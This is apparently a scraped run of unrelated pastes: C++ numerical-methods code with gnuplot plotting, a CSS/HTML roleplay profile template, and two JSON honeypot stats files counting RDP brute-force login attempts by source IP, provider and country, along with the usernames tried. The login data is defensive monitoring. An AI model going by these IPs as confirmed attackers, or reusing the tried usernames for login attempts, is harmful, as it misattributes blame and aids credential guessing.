                    ans->data[i][j] = data[i][j] - matrix.data[i][j];
                }
            }
            return *ans;
        }
        Matrix& operator* (const Matrix& matrix) {
            if (matrix.n != m) {
                throw runtime_error(""Error: the dimensional problem occurred"");
            }
            Matrix *ans = new Matrix(n, matrix.m);
            for (int i = 0; i < n; i++) {
                for (int j = 0; j < matrix.m; j++) {
                    for (int k = 0; k < m; k++) {
                        ans->data[i][j] += data[i][k]*matrix.data[k][j];
                    }
                }
            }
            return *ans;
        }
        Matrix& operator* (double a) {
            Matrix *ans = new Matrix(n, m);
            for (int i = 0; i < n; i++) {
                for (int j = 0; j < m; j++) {
                    ans->data[i][j] += data[i][j]*a;
                }
            }
            return *ans;
        }
        Matrix& transpose() {
            Matrix *ans = new Matrix(m, n);
            for (int i = 0; i < n; i++) {
                for (int j = 0; j < m; j++) {
                    ans->data[j][i] = data[i][j];
                }
            }
            return *ans;
        }
        Matrix& operator| (const Matrix& matrix) {
            if (matrix.n != n) {
                throw runtime_error(""Error: the dimensional problem occurred"");
            }
            Matrix *ans = new Matrix(n, matrix.m + m);
            for (int i = 0; i < n; i++) {
                for (int j = 0; j < m; j++) {
                    ans->data[i][j] = data[i][j];
                }
                for (int j = m; j < matrix.m + m; j++) {
                    ans->data[i][j] = matrix.data[i][j-m];
                }
            }
            return *ans;
        }
        vector<double>& operator[] (int x) {
            if (x >= n) {
                throw runtime_error(""Error: index out of range"");
            } 
            return data[x];
        }
        friend istream& operator>> (istream &is, Matrix &matrix);
        friend ostream& operator<< (ostream &os, Matrix &matrix);
        double get(int i, int j) {
            if (i >= n || j >= m) {
                throw out_of_range(""Out of bound for get"");
            }
            return data[i][j];
        }
        bool is_square() {
            return n == m;
        }
        int get_n() {
            return n;
        }
        int get_m() {
            return m;
        }
        void normalize_diagonally() {
            for (int i = 0; i < n; i++) {
                if (data[i][i] != 0) {
                    for (int j = i + 1; j < m; j++) {
                        data[i][j] /= data[i][i];
                    }
                    data[i][i] = 1;
                }
            }
        }
        void separate() {
            // for (int i = 0; i < n; i++) {
            //     for (int j = 0; j < m - 1; j++) {
            //         // if (abs(data[i][j]) < 0.005) {
            //         //     // // cout << fixed << abs(data[i][j]) << ' ';
            //         // } else
            //         // // // cout << fixed << data[i][j] << ' ';
            //     }
            //     // cout << '\n';
            // }
            // for (int j = 0; j < n; j++) {
            //     if (abs(data[j][m - 1]) < 0.005) {
            //         // cout << fixed << abs(data[j][m - 1]) << ' ';
            //     } else
            //     // cout << fixed << data[j][m - 1] << ' ';
            // }
            // // cout << '\n';
        }
        void last() {
            // for (int j = 0; j < n; j++) {
            //     if (abs(data[j][m - 1]) < 0.005) {
            //         // cout << fixed << abs(data[j][m - 1]) << ' ';
            //     } else
            //     // cout << fixed << data[j][m - 1] << ' ';
            // }
            // // cout << '\n';
        }
        Matrix& inverse();
        operator Vector();
};

class Vector : public Matrix {
public:
    double normalize() {
        double l = 0;
        for (int i = 0; i < n; i++) {
            l += data[i][0] * data[i][0];
        }
        return l;
    }
    Vector(vector<double> input) : Matrix(input.size(), 1) {
        for (int i = 0 ; i < input.size(); i++) {
            data[i][0] = input[i];
        }
    }
    Vector() {
        n = 0;
        m = 0;
    }
    double operator[] (int i) {
        if (i >= n) {
            throw runtime_error(""Error: Out of range"");
        }
        return data[i][0];
    }
    friend istream& operator>> (istream &is, Vector& vector);
};

Matrix::operator Vector() {
    if (m != 1) {
        throw runtime_error(""Error in cast from Matrix to Vector"");
    }
    vector<double> a;
    for (auto el : data) {
        a.push_back(el[0]);
    }
    return *(new Vector(a));
}

class LeastSquareAproxMatrix : public Matrix {
public:
    LeastSquareAproxMatrix(int m, vector<double> input) : Matrix(input.size(), m + 1) {
        for (int i = 0; i < input.size(); i++) {
            double pow = 1;
            for (int j = 0; j <= m; j++) {
                data[i][j] = pow;
                pow *= input[i];
            }
        }
    }

};

class SquareMatrix : public Matrix {
public:
    SquareMatrix() {
        n = 0;
        m = 0;
    }
    SquareMatrix* upper_triangular() {
        SquareMatrix* ans = new SquareMatrix(n);
        for (int i = 0; i < n; i++) {
            for (int j = i + 1; j < n; j++) {
                (*ans)[i][j] = data[i][j];
            }
        }
        return ans;
    }
    SquareMatrix* lower_triangular() {
        SquareMatrix* ans = new SquareMatrix(n);
        for (int i = 0; i < n; i++) {
            for (int j = 0; j < i; j++) {
                (*ans)[i][j] = data[i][j];
            }
        }
        return ans;
    }
    SquareMatrix& build_apha() {
        SquareMatrix* ans = new SquareMatrix(n);
        for (int i = 0; i < n; i++) {
            for (int j = 0; j < m; j++) {
                if (i == j) {
                    (*ans)[i][j] = 0;
                } else {
                    (*ans)[i][j] = -data[i][j]/data[i][i];
                }
            }
        }
        return *ans;
    }
    Vector& build_beta(Vector& b) {
        vector<double> a;
        for (int i = 0; i < n; i++) {
            a.push_back(b[i] / data[i][i]);
        }
        Vector* ans = new Vector(a);
        return *ans;
    }
    bool is_diagonal_dominant() {
        for (int i = 0; i < n; i++) {
            double sum = 0;
            for (int j = 0; j < m; j++) {
                if (i != j) {
                    sum += data[i][j];
                }
            }
            if (data[i][i] < sum) {
                return 0;
            }
        }
        return 1;
    }
    SquareMatrix(int x) : Matrix(x, x) {};
    friend istream& operator>> (istream &is, SquareMatrix &matrix);
    void modify_for_l() {
        for (int i = 0; i < n; i++) {
            for (int j = 0; j <= i; j++) {
                data[i][j] = 1;
            }
        }
    }
};

class IdentityMatrix : public SquareMatrix {
public:
    IdentityMatrix() {
        n = 0;
        m = 0;
    }
    IdentityMatrix(int x) : SquareMatrix(x) {
        for (int i = 0; i < x; i++) {
            data[i][i] = 1;
        }
    }
};
class EliminationMatrix : public IdentityMatrix {
public:
    EliminationMatrix(Matrix& matrix, int j, int i) : IdentityMatrix(matrix.get_n()) {
        data[j - 1][i - 1] = -matrix.get(j - 1, i - 1) / matrix.get(i - 1, i - 1);
    }
    void negative() {
        for(int i = 0; i < n; i++) {
            for (int j = 0; j < m; j++) {
                data[i][j] = -data[i][j];
            }
        }
    }
};

class PermutationMatrix : public IdentityMatrix {
public:
    PermutationMatrix(int x, int i, int j) : IdentityMatrix(x) {
        data[j - 1][j - 1] = 0;
        data[i - 1][i - 1] = 0; 
        data[i - 1][j - 1] = 1;
        data[j - 1][i - 1] = 1;
    }
};

istream& operator>> (istream &is, SquareMatrix& matrix) {
    is >> matrix.n;
    matrix.m = matrix.n;
    matrix.data.assign(matrix.n, vector<double>(matrix.m));
    for (int i = 0; i < matrix.n; i++) {
        for (int j = 0; j < matrix.m; j++) {
            is >> matrix.data[i][j];
        }
    }
    return is;
}
istream& operator>> (istream &is, Vector& matrix) {
    is >> matrix.n;
    matrix.m = 1;
    matrix.data.assign(matrix.n, vector<double>(matrix.m));
    for (int i = 0; i < matrix.n; i++) {
        for (int j = 0; j < matrix.m; j++) {
            is >> matrix.data[i][j];
        }
    }
    return is;
}
istream& operator>> (istream &is, Matrix& matrix) {
    is >> matrix.n >> matrix.m;
    matrix.data.assign(matrix.n, vector<double>(matrix.m));
    for (int i = 0; i < matrix.n; i++) {
        for (int j = 0; j < matrix.m; j++) {
            is >> matrix.data[i][j];
        }
    }
    return is;
}
ostream& operator<< (ostream &os, Matrix& matrix) {
    for (int i = 0; i < matrix.n; i++) {
        for (int j = 0; j < matrix.m; j++) {
            if (abs(matrix.data[i][j]) < 0.005) {
                os << fixed << abs(matrix.data[i][j]) << ' ';
            } else
            os << fixed << matrix.data[i][j] << ' ';
        }
        os << '\n';
    }
    return os;
}

bool gaus_elimination(Matrix& a, int &step) {
    bool sign = 1;
    for (int i = 0; i < a.get_n(); i++) {
        double m = 0;
        int m_i = 0;
        for (int j = i; j < a.get_n(); j++) {
            if (abs(a.get(j, i)) > abs(m))  {
                m = a.get(j, i);
                m_i = j;
            }
        }
        if (m_i != i) {
            // // cout << fixed  << ""step #"" << step << "": permutation"" << '\n';
            PermutationMatrix p(a.get_n(), m_i + 1, i + 1);
            a = p * a;
            // a.separate();
            sign = !sign;
            step++;
        }
        for (int j = i + 1; j < a.get_n(); j++) {
            if (a.get(j, i) != 0) {
                // // cout << fixed  << ""step #"" << step << "": elimination"" << '\n';
                step++;
                EliminationMatrix e(a, j + 1, i + 1);
                a = e * a;
                // a.separate();
            }   
        }
    }
    return sign;
}

void gaus_back_elimination(Matrix& a, int &step) {
    for (int i = a.get_n() - 1; i >= 0; i--) {
        if (a.get(i, i) != 0) {
            for (int j = i - 1 ; j >= 0; j--) {
                if (a.get(j, i) != 0) {
                    // // cout << fixed  << ""step #"" << step << "": elimination"" << '\n';
                    step++;
                    EliminationMatrix e(a, j + 1, i + 1);
                    a = e * a;
                    a.separate();
                }
            }
        }
    }
}

Matrix& Matrix::inverse() {
    Matrix* ans = new Matrix(n, m);
    IdentityMatrix I(n);
    Matrix aug = *this | I;
    int step = 1;
    gaus_elimination(aug, step);
    gaus_back_elimination(aug, step);
    aug.normalize_diagonally();
    for (int j = 0; j < aug.get_n(); j++) {
        for (int i = aug.get_n(); i < aug.get_m(); i++) {
            (*ans)[j][i - aug.get_n()] = aug.get(j, i);
        }
    }

    return *ans;
}

class ColumnVector : public Matrix {
public:
    ColumnVector() {
        n = 0;
        m = 0;
    }
    ColumnVector(int x) {
        n = x;
        m = 1;
        data.resize(n, vector<double>(1));
    }
    friend istream& operator>> (istream &is, ColumnVector &matrix);
    friend ostream& operator<< (ostream &os, ColumnVector &matrix);
};

istream& operator>> (istream &is, ColumnVector& matrix) {
    is >> matrix.n;
    matrix.m = 1;
    matrix.data.resize(matrix.n,vector<double>(1));
    for (int i = 0; i < matrix.n; i++) {
        is >> matrix.data[i][0];
    }
    return is;
}
ostream& operator<< (ostream &os, ColumnVector& matrix) {
    for (int i = 0; i < matrix.n; i++) {
        os << matrix.data[i][0] << ' ';
    }
    os << '\n';
    return os;
}

bool is_singular( Matrix a) {
    for (int i = 0; i < a.get_n(); i++) {
        double m = 0;
        int m_i = 0;
        for (int j = i; j < a.get_n(); j++) {
            if (abs(a.get(j, i)) > abs(m))  {
                m = a.get(j, i);
                m_i = j;
            }
        }
        if (m_i != i) {
            PermutationMatrix p(a.get_n(), m_i + 1, i + 1);
            a = p * a;
        }
        for (int j = i + 1; j < a.get_n(); j++) {
            if (a.get(j, i) != 0) {
                EliminationMatrix e(a, j + 1, i + 1);
                a = e * a;
            }   
        }
    }
    for (int i = 0; i < a.get_n(); i++) {
        if (a.get(i, i) == 0) {
            return 0;
        }
    }
    return 1;
}

double calc_epsilon(Vector& a, Vector& b) {
    if (a.get_n() != b.get_n()) {
        throw runtime_error(""cannot calculate epsilon"");
    }
    double ans = 0;
    for (int i = 0; i < a.get_n(); i++) {
        ans += (a[i] - b[i]) * (a[i] - b[i]);
    }
    return sqrt(ans);
}

void jacobi_method(SquareMatrix& alpha, Vector& beta, Vector& x, double epsilon, int step) {
    cout << ""x("" << step << ""):\n"";
    Vector new_x = alpha*x + beta;
    cout << new_x;
    cout << ""e:\n"" << calc_epsilon(new_x, x) << '\n';
    if (calc_epsilon(new_x, x) < epsilon) {
        x = new_x;
        return;
    }
    jacobi_method(alpha, beta, new_x, epsilon, step + 1);
    x = new_x;
}

double min(vector<double>& a) {
    double m = 1000000000;
    for (double el : a) {
        m = min(el, m);
    }
    return m;
}
double max(vector<double>& a) {
    double m = -100000000;
    for (double el : a) {
        m = max(el, m);
    }
    return m;
}

void seidel_method(Matrix& B, Matrix& C, Vector& beta, Vector& x, double epsilon, int step) {
    cout << ""x("" << step << ""):\n"";
    IdentityMatrix I(B.get_n());
    Vector new_x = (I - B).inverse() * C * x + (I - B).inverse() * beta;
    cout << new_x;
    cout << ""e:\n"" << calc_epsilon(new_x, x) << '\n';
    if (calc_epsilon(new_x, x) < epsilon) {
        x = new_x;
        return;
    }
    seidel_method(B, C, beta, new_x, epsilon, step + 1);
    x = new_x;
}
FILE* pipe;
int main() {
    pipe = popen(""/usr/bin/gnuplot -persist"", ""w"");
    cout.precision(2);
    double v, k;
    cin >> v;
    cin >> k;
    double a1, b1, a2, b2;
    cin >> a1 >> b1 >> a2 >> b2;
    double T;
    cin >> T;
    double n;
    cin >> n;
    
    SquareMatrix A(2);
    A[0][1] = -a2*b1/b2;
    A[1][0] = a1*b2/b1;
    vector<double> t;
    vector<double> ks;
    vector<double> vs;
    Vector X_0({v, k});
    // real solution
    // for (double i = 0; i <= T; i += T / n) {
    //     t.push_back(i);
    //     complex<double> l1 = sqrt(abs(A[0][1] * A[1][0]))*1i;
    //     complex<double> l2 = -sqrt(abs(A[0][1] * A[1][0]))*1i;
    //     complex<double> y = (pow(M_E, l2*i) - pow(M_E, l1*i)) / (l2 - l1);
    //     complex<double> x = pow(M_E, l1*i)-l1*y;
    //     IdentityMatrix I(2);
    //     Matrix V = I*x.real() + A*y.real();
    //     Matrix Ans = V * X_0;
    //     vs.push_back(Ans[0][0]);
    //     ks.push_back(Ans[1][0]);
    // }
    
    // just formula
    
    for (double i = 0; i <= T; i += T / n) {
        vs.push_back(v*cos(sqrt(a1 * a2) * i) - k*(sqrt(a2)*b1/b2*sqrt(a1))*sin(sqrt(a1*a2)*i));
        ks.push_back(v*(sqrt(a1)*b2/b1*sqrt(a2))*sin(sqrt(a1*a2)*i)+k*cos(sqrt(a1*a2)*i));
        t.push_back(i);
    }
    cout << ""t:\n"";
    for (double el : t) {
        cout << fixed << el << ' ';
    }
    fputs((""plot [""+ to_string(0 - 1) + "":"" + to_string(int (T + 1)) + ""][""+ to_string(int(min(min(ks), min(vs)) - 1)) + "":"" + to_string(int(max(max(ks), max(vs))+ 1)) + ""] '-' using 1:2 title 'v(t)' with lines , '-' title 'k(t)' with lines"").c_str(), pipe);
    fprintf(pipe, ""\n"");
    cout << ""\nv:\n"";
    for (int i = 0; i < vs.size(); i++) {
        cout << fixed << vs[i] << ' ';
        fprintf(pipe, ""%f\t%f\n"", t[i], vs[i]);
    }
    fprintf(pipe, ""%s\n"", ""e"");
    cout << ""\nk:\n"";
    for (int i = 0; i < vs.size(); i++) {
        cout << fixed << ks[i] << ' ';
        fprintf(pipe, ""%f\t%f\n"", t[i], ks[i]);
    }
    fprintf(pipe, ""%s\n"", ""e"");
    fputs((""plot [""+ to_string(int(min(ks) - 1)) + "":"" + to_string(int(max(ks) + 1)) + ""][""+ to_string(int(min(vs) - 1)) + "":"" + to_string(int(max(vs) + 1)) + ""] '-' using 1:2 title 'v(k)' with lines"").c_str(), pipe);
    fprintf(pipe, ""\n"");
    for (int i = 0; i < vs.size(); i++) {
        cout << fixed << ks[i] << ' ';
        fprintf(pipe, ""%f\t%f\n"", ks[i], vs[i]);
    }
    fprintf(pipe, ""%s\n"", ""e"");
    pclose(pipe);
}"
k7bJVXmc,𝐒𝐈𝐗,wilderanima,CSS,Tuesday 30th of April 2024 07:27:33 PM CDT,"     Hello, wildlings! 
 
  A straightforward placeholder code with a couple of images and a scrolling blurb box. 
  Follow the dimensions of the images, otherwise, they won't fit properly. 
  Feel free to change colors! 
 
  Please do not steal this code. 
  Leave the credit! <3 Happy Writing! 
 
— — — — — — — — — — — — — — 

<style>

@import url('https://fonts.googleapis.com/css2?family=Walter+Turncoat&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Economica:ital,wght@0,400;0,700;1,400;1,700&display=swap');

body {
cursor: url(https://66.media.tumblr.com/232c090ebdd37ae4bc17adb54e1e0344/tumblr_inline_ol4nwhvSwg1uxxza6_1280.png), auto;
background-color: #1b2a09; }

::-webkit-scrollbar {
display: none;}
 
::selection {
background: ;
color: white;}

a {
text-decoration: none;
color: #a6c1bc;
}

a:hover {
color: #e5cfa2;
}

.wilder {
position: fixed;
bottom: 0px;
right: 0px; }

.container {
position: absolute;
margin: auto;
top: 0px;
bottom: 0px;
left: 0px;
right: 0px;
height: 550px;
width: 550px;
background-color: #738859;
border-radius: 10px; }

.image1 {
position: absolute;
margin: auto;
top: 25px;
bottom: 0px;
left: 0px;
right: 0px;
height: 338px;
width: 450px;
background: url(https://placehold.co/450x338.png);
background-size: cover;
border: 5px solid #1b2a09;
filter: grayscale(0%);
border-radius: 10px; }

.image2 {
position: absolute;
bottom: 25px;
left: -150px;
right: 0px;
height: 150px;
width: 268px;
background: url(https://placehold.co/268x150.png); <!--bottom-->
background-size: cover;
border: 5px solid #738859;
filter: grayscale(0%); 
border-radius: 10px; }

.image3 {
position: absolute;
top: 25px;
right: -150px;
height: 150px;
width: 268px;
background: url(https://placehold.co/268x150.png); <!--top-->
background-size: cover;
border: 5px solid #738859;
filter: grayscale(0%);
border-radius: 10px; }

.name {
position: absolute; 
top: 50px;
left: 60px;
font-family: walter turncoat;
font-size: 50px;
color: #1b2a09;
}

.blurb {
position: absolute;
bottom: -50px;
right: -75px;
height: 195px;
width: 240px;
background: rgba(177, 163, 110, 0.3);
backdrop-filter: blur(7.0px);
-webkit-backdrop-filter: blur(7.0px);
mix-blend-mode: overlay;
border-radius: 10px 10px; }

.blin {
position: absolute;
bottom: -40px;
right: -65px;
height: 160px;
width: 200px;
padding: 8px;
background: rgba(13, 13, 13, 0.4);
backdrop-filter: blur(7.0px);
-webkit-backdrop-filter: blur(7.0px);
border-radius: 10px 10px;
color: #fff;
font: 13px economica;
text-align: right;
overflow: auto; }

.blin b {
font: 16px walter turncoat;
color: #CFC06A;
mix-blend-mode: overlay;
}
.blin i {
font: 14px economica;
font-style: italic;
}
.blin p {
margin: 5px;
padding: 5px;
outline: 1px solid #9A9B8C;
text-align: justify;
}

.cons {
position: absolute;
bottom: 25px;
left: 140px;
height: 55px;
width: 240px;
background: #738859; 
border: 1px solid #738859;
padding: 0px;
overflow: auto;
}

.contact {
width: 35px; 
height: 35px; 
border: 1px solid #1b2a09; 
display: inline-block; 
transition: all 500ms linear; 
object-fit: cover; 
margin: 5px; 
margin-bottom: 8px; 
padding: 4px; 
background: transparent; 
overflow:; }

.contact img { 
width: 35px; 
height: 35px; 
transition: all 500ms linear; 
-webkit-filter: grayscale(0%);
/* Safari 6.0 - 9.0 */ 
filter: grayscale(0%); 
opacity: 1; }

</style>

<!--
 MUSIC PLAYER #02 by glenthemes
 ♬ glenthpvs.tumblr.com/player02
--->
<script src=""//cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js""></script>
<link href=""//fonts.googleapis.com/css?family=Readex+Pro"" rel=""stylesheet"">
<link href=""//glenthemes.github.io/-music-/glenplayer02.css"" rel=""stylesheet"">
<script src=""//glenthemes.github.io/-music-/glenplayer02.js""></script>
<style element=""glenplayer02"">
:root {
 --MusicPlayer-Position:bottom left;
 --MusicPlayer-Edge-Offset:15px;
 
 --MusicPlayer-Buttons-Size:15px;
 --MusicPlayer-Buttons-Color:#738859;
 --MusicPlayer-Buttons-Fill:yes;

}
</style>

<div glenplayer02>
 <div controls></div>
 <i class=""aa-line-icons"" icon-name=""music-2""></i>
 <audio src=""MUSIC_LINK"" volume=""100%""></audio>
</div>

<div class=""wilder""><a target=""_blank"" href=""https://pastebin.com/u/wilderanima"" title=""code by wilder.""><img src=""https://i.imgur.com/hCJmFVu.png"" width=""75px;""></a></div>

<div class=""container"">
<div class=""image1""></div>
<div class=""image2""></div>
<div class=""image3""></div>
<div class=""name"">Name Name</div>

<div class=""blurb""></div>
<div class=""blin"">
<p>put whatever you want in here!</p>
<p>put whatever you want in here!</p>
<p>put whatever you want in here!</p>
<p>put whatever you want in here!</p>
<p><b>bold</b> <i>italic</i> <a>link</a></p> <br>

Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. <br><br>

Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. <br><br>

</div>

<div class=""cons"">

<a target=""_blank"" href=""https://roleplay.chat/profile.php?user="" title=""Name."" >
 <div class=""contact"">
<img class=""contact-img"" src=""https://placehold.co/50x50.png""> 
 </div> </a>

<a target=""_blank"" href=""https://roleplay.chat/profile.php?user="" title=""Name."" >
 <div class=""contact"">
<img class=""contact-img"" src=""https://placehold.co/50x50.png""> 
 </div> </a>

<a target=""_blank"" href=""https://roleplay.chat/profile.php?user="" title=""Name."" >
 <div class=""contact"">
<img class=""contact-img"" src=""https://placehold.co/50x50.png""> 
 </div> </a>

<a target=""_blank"" href=""https://roleplay.chat/profile.php?user="" title=""Name."" >
 <div class=""contact"">
<img class=""contact-img"" src=""https://placehold.co/50x50.png""> 
 </div> </a>

</div>

</div>"
DKefmtQu,2024-04-30_stats.json,rdp_snitch,JSON,Tuesday 30th of April 2024 07:18:09 PM CDT,"{
  ""ip"": {
    ""172.232.235.218"": 6,
    ""45.227.254.9"": 9,
    ""103.238.234.199"": 3,
    ""167.94.138.33"": 3,
    ""212.41.9.9"": 9,
    ""205.210.31.235"": 9,
    ""212.41.9.11"": 9,
    ""116.140.196.215"": 3,
    ""185.170.144.3"": 6,
    ""87.251.75.145"": 9,
    ""118.193.58.187"": 3,
    ""205.210.31.105"": 9,
    ""159.65.82.237"": 3,
    ""165.22.143.165"": 12,
    ""157.230.62.181"": 3,
    ""170.187.228.104"": 2181,
    ""194.165.16.37"": 6,
    ""152.32.183.22"": 3,
    ""194.165.16.76"": 6,
    ""123.56.20.194"": 3,
    ""198.235.24.13"": 9,
    ""112.4.139.162"": 3,
    ""20.185.249.20"": 6,
    ""87.251.75.64"": 3,
    ""36.91.222.100"": 3,
    ""2.181.168.108"": 3,
    ""94.232.46.148"": 3,
    ""45.227.254.23"": 9,
    ""187.190.60.112"": 3,
    ""198.235.24.194"": 9,
    ""81.19.135.47"": 9
  },
  ""asn"": {
    ""AS63949"": 2187,
    ""AS267784"": 18,
    ""AS140810"": 3,
    ""AS398324"": 3,
    ""AS49505"": 18,
    ""AS396982"": 36,
    ""AS4837"": 3,
    ""AS197414"": 6,
    ""AS208091"": 12,
    ""AS135377"": 6,
    ""AS14061"": 18,
    ""AS48721"": 12,
    ""AS37963"": 3,
    ""AS56046"": 3,
    ""AS8075"": 6,
    ""AS7713"": 3,
    ""AS58224"": 3,
    ""AS212482"": 3,
    ""AS22884"": 3,
    ""AS209588"": 9
  },
  ""isp"": {
    ""Akamai Technologies, Inc."": 2187,
    ""Flyservers S.A."": 39,
    ""MAYTINHVPSTTT"": 3,
    ""Censys, Inc."": 3,
    ""OOO \""Network of data-centers \""Selectel\"""": 18,
    ""Google LLC"": 36,
    ""China Unicom CHINA169 Network"": 3,
    ""Xhost Internet Solutions LP"": 21,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""DigitalOcean, LLC"": 18,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Microsoft Corporation"": 6,
    ""PT Telekomunikasi Indonesia"": 3,
    ""Iran Telecommunication Company PJS"": 3,
    ""Total Play Telecomunicaciones SA De CV"": 3
  },
  ""org"": {
    ""Akamai Technologies, Inc."": 6,
    ""UAB Host Baltic"": 18,
    ""Vpsttt Computer Company Limited"": 3,
    ""Censys, Inc"": 3,
    ""Unknown"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""China United Network Communications Corporation Limited"": 3,
    ""Xhostis"": 6,
    ""Xhost Internet Solutions"": 12,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""DigitalOcean, LLC"": 18,
    ""Linode"": 2181,
    ""Flyservers S.A"": 12,
    ""Ucloud Information Technology"": 3,
    ""Aliyun Computing Co., LTD"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Microsoft Azure Cloud (eastus)"": 6,
    ""Telekomunikasi Indonesia"": 3,
    ""tcsb DSL"": 3,
    ""Dmitriy Panchenko"": 3,
    ""Total Play Telecomunicaciones SA De CV"": 3,
    ""Alviva Holding Limited"": 9
  },
  ""regionName"": {
    ""Jakarta"": 9,
    ""Vilnius"": 18,
    ""Ho Chi Minh"": 3,
    ""Michigan"": 3,
    ""Moscow"": 18,
    ""California"": 48,
    ""Beijing"": 6,
    ""North Holland"": 18,
    ""Hesse"": 12,
    ""England"": 3,
    ""New Jersey"": 3,
    ""North West"": 2181,
    ""Kaunas"": 12,
    ""Virginia"": 9,
    ""Jiangsu"": 3,
    ""Sistan and Baluchestan"": 3,
    ""Perm Krai"": 3,
    ""Hidalgo"": 3
  },
  ""country"": {
    ""Indonesia"": 9,
    ""Lithuania"": 30,
    ""Vietnam"": 3,
    ""United States"": 63,
    ""Russia"": 21,
    ""China"": 9,
    ""The Netherlands"": 18,
    ""Germany"": 12,
    ""United Kingdom"": 3,
    ""Singapore"": 2181,
    ""Iran"": 3,
    ""Mexico"": 3
  },
  ""account"": {
    ""hello"": 24,
    ""Domain"": 45,
    ""(empty)"": 12,
    ""yeQgJxOjr"": 3,
    ""aKJWKC"": 3,
    ""YDiBzJ"": 3,
    ""Administr"": 18,
    ""Administrator"": 318,
    ""pTsnsDfjz"": 3,
    ""Gsaznb"": 3,
    ""LvbeCO"": 3,
    ""ji5xjb6k"": 12,
    ""beio"": 3,
    ""Admin"": 312,
    ""Whatuptime.com"": 312,
    ""Jakartakini123#"": 312,
    ""Hello World"": 312,
    ""TinHocThucHanh"": 312,
    ""Hey"": 309,
    ""Test"": 15,
    ""gyhXZPxay"": 3,
    ""ZwhDsz"": 3,
    ""HufDEm"": 3,
    ""KuFOpCi"": 3,
    ""uNAmAgkcZ"": 3,
    ""vFxxvX"": 3,
    ""nDfwrd"": 3
  },
  ""keyboard"": {
    ""Unknown"": 2355
  },
  ""client_build"": {
    ""Unknown"": 2355
  },
  ""client_name"": {
    ""Unknown"": 2355
  },
  ""ip_type"": {
    ""hosting"": 2259,
    ""Unknown"": 75,
    ""hosting & proxy"": 15,
    ""mobile"": 3,
    ""proxy"": 3
  }
}"
g0Ga4aWC,2024-04-30_stats.json,rdp_snitch,JSON,Tuesday 30th of April 2024 07:16:16 PM CDT,"{
  ""ip"": {
    ""172.232.235.218"": 4,
    ""45.227.254.9"": 6,
    ""103.238.234.199"": 2,
    ""167.94.138.33"": 2,
    ""212.41.9.9"": 6,
    ""205.210.31.235"": 6,
    ""212.41.9.11"": 6,
    ""116.140.196.215"": 2,
    ""185.170.144.3"": 4,
    ""87.251.75.145"": 6,
    ""118.193.58.187"": 2,
    ""205.210.31.105"": 6,
    ""159.65.82.237"": 2,
    ""165.22.143.165"": 8,
    ""157.230.62.181"": 2,
    ""170.187.228.104"": 1454,
    ""194.165.16.37"": 4,
    ""152.32.183.22"": 2,
    ""194.165.16.76"": 4,
    ""123.56.20.194"": 2,
    ""198.235.24.13"": 6,
    ""112.4.139.162"": 2,
    ""20.185.249.20"": 4,
    ""87.251.75.64"": 2,
    ""36.91.222.100"": 2,
    ""2.181.168.108"": 2,
    ""94.232.46.148"": 2,
    ""45.227.254.23"": 6,
    ""187.190.60.112"": 2,
    ""198.235.24.194"": 6,
    ""81.19.135.47"": 6
  },
  ""asn"": {
    ""AS63949"": 1458,
    ""AS267784"": 12,
    ""AS140810"": 2,
    ""AS398324"": 2,
    ""AS49505"": 12,
    ""AS396982"": 24,
    ""AS4837"": 2,
    ""AS197414"": 4,
    ""AS208091"": 8,
    ""AS135377"": 4,
    ""AS14061"": 12,
    ""AS48721"": 8,
    ""AS37963"": 2,
    ""AS56046"": 2,
    ""AS8075"": 4,
    ""AS7713"": 2,
    ""AS58224"": 2,
    ""AS212482"": 2,
    ""AS22884"": 2,
    ""AS209588"": 6
  },
  ""isp"": {
    ""Akamai Technologies, Inc."": 1458,
    ""Flyservers S.A."": 26,
    ""MAYTINHVPSTTT"": 2,
    ""Censys, Inc."": 2,
    ""OOO \""Network of data-centers \""Selectel\"""": 12,
    ""Google LLC"": 24,
    ""China Unicom CHINA169 Network"": 2,
    ""Xhost Internet Solutions LP"": 14,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""DigitalOcean, LLC"": 12,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Microsoft Corporation"": 4,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Iran Telecommunication Company PJS"": 2,
    ""Total Play Telecomunicaciones SA De CV"": 2
  },
  ""org"": {
    ""Akamai Technologies, Inc."": 4,
    ""UAB Host Baltic"": 12,
    ""Vpsttt Computer Company Limited"": 2,
    ""Censys, Inc"": 2,
    ""Unknown"": 12,
    ""Palo Alto Networks, Inc"": 24,
    ""China United Network Communications Corporation Limited"": 2,
    ""Xhostis"": 4,
    ""Xhost Internet Solutions"": 8,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""DigitalOcean, LLC"": 12,
    ""Linode"": 1454,
    ""Flyservers S.A"": 8,
    ""Ucloud Information Technology"": 2,
    ""Aliyun Computing Co., LTD"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Microsoft Azure Cloud (eastus)"": 4,
    ""Telekomunikasi Indonesia"": 2,
    ""tcsb DSL"": 2,
    ""Dmitriy Panchenko"": 2,
    ""Total Play Telecomunicaciones SA De CV"": 2,
    ""Alviva Holding Limited"": 6
  },
  ""regionName"": {
    ""Jakarta"": 6,
    ""Vilnius"": 12,
    ""Ho Chi Minh"": 2,
    ""Michigan"": 2,
    ""Moscow"": 12,
    ""California"": 32,
    ""Beijing"": 4,
    ""North Holland"": 12,
    ""Hesse"": 8,
    ""England"": 2,
    ""New Jersey"": 2,
    ""North West"": 1454,
    ""Kaunas"": 8,
    ""Virginia"": 6,
    ""Jiangsu"": 2,
    ""Sistan and Baluchestan"": 2,
    ""Perm Krai"": 2,
    ""Hidalgo"": 2
  },
  ""country"": {
    ""Indonesia"": 6,
    ""Lithuania"": 20,
    ""Vietnam"": 2,
    ""United States"": 42,
    ""Russia"": 14,
    ""China"": 6,
    ""The Netherlands"": 12,
    ""Germany"": 8,
    ""United Kingdom"": 2,
